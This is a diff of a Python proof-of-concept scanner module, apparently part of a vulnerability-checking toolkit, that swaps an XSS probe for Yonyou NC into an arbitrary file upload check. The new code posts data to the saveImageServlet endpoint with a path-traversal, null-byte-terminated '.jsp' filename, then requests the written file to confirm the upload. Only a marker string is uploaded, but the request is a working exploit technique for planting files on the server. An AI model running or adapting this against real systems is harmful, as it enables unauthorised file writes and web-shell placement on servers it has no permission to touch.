@@ -1,6 +1,6 @@
 '''
 Function:
-    yonyouNC xss漏洞
+    用友NC saveImageServlet接口 任意文件上传
 Author:
     花果山
 Wechat official account：
@@ -18,22 +18,22 @@ GitHub:
 import requests
 import random
 import string
-import os
-import sys
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
-path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-sys.path.append(path)
-from modules import get_user_agent
 
 
 class poc:
     def __init__(self, url, proxies):
         self.url = url
-        self.headers = {
-            'User-Agent': get_user_agent.get_user_agent(),
+        self.headers_upload = {
+            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
+            'Content-Type': 'application/octet-stream'
         }
+        self.headers_check = {
+            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
+        }
+        self.session = requests.Session()
         self.result_text = ""
         self.proxies = proxies
 
@@ -44,18 +44,21 @@ class poc:
         return netloc, scheme
 
     def vuln(self, netloc, scheme):
+        filename = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+        url = "{}://{}/portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{}.jsp%00".format(scheme, netloc, filename)
         char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
         payload = "test" + char
-        url = "{}://{}/uapws/pages/iframe.jsp?src=javascript:alert({})".format(scheme, netloc, payload)
         try:
-            result = requests.get(url=url, headers=self.headers, proxies=self.proxies, verify=False)
-            if payload in result.text:
+            result = self.session.post(url=url, data=payload, headers=self.headers_upload, proxies=self.proxies, verify=False, timeout=3)
+            check = self.session.get(url="{}://{}/portal/processxml/{}.jsp".format(scheme, netloc, filename), proxies=self.proxies, headers=self.headers_check, verify=False, timeout=3)
+            if payload in check.text:
                 target = urlparse(url)
-                self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站脚本注入攻击漏洞\033[0m
-                 GET {} HTTP/1.1
-                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
+                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
+                 POST {} HTTP/1.1
+                 Host: {}""".format(target.path, target.netloc)
                 for request_type, request_text in dict(result.request.headers).items():
                     self.result_text += "\n                 {}: {}".format(request_type, request_text)
+                self.result_text += "\n\n                 {}".format(payload)
                 return True
             else:
                 return False
@@ -67,6 +70,6 @@ class poc:
         netloc = all[0]
         scheme = all[1]
         if self.vuln(netloc, scheme):
-            return self.result_text
+             return self.result_text
         else:
             return False
